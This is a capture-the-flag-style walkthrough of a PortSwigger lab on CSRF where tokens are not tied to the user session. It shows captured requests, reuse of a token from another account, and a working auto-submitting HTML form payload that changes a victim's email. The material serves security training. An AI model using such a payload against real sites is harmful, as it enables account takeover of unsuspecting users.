# Lab: CSRF where token is not tied to user session
# https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session

```bash
# Login to  wiener:peter update your email to a@gmail.com.

# Open the burp suite and check change-email.

POST /my-account/change-email HTTP/2
Host: x.web-security-academy.net
Cookie: session=x
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: https://x.web-security-academy.net
Referer: https://x.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

email=a%40gmail.com&csrf=D4p5QM6q99tdPH408K5suh0A8If157eM

# Copy the csrf value.
```
```bash
# Open new private window. Login to carlos:montoya and inspect email input part.

<input required="" type="hidden" name="csrf" value="yhBvc22PsVBzHXngzWVB03uWroG6d9RD">

# Take the csrf value and send your wiener account's change-email post request to repeater.

# Change csrf to carlos's csrf, change email to b@gmail.com and send request.

csrf=yhBvc22PsVBzHXngzWVB03uWroG6d9RD

# It works!
```

```bash
<input required="" type="hidden" name="csrf" value="yhBvc22PsVBzHXngzWVB03uWroG6d9RD">

# Copy this to create our payload.(you can remove required="" if you want)

<form method="POST" action="https://x.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="virusa@gmail.com">
<input type="hidden" name="csrf" value="TbFoMltz47Xeme8RbvbwCwwPMcnZwE5Z">
</form>
<script>
	document.forms[0].submit();
</script>

# Before you deliver exploit to victim you have to refresh change email page of wiener.
# After that inspect search and take it's new csrf token value and replace it with the one in the code.
# Now you can send it to victim.

# We took new csrf token because once you use a csrf token it's getting invalidated so you need new token that hasn't been used before.
```
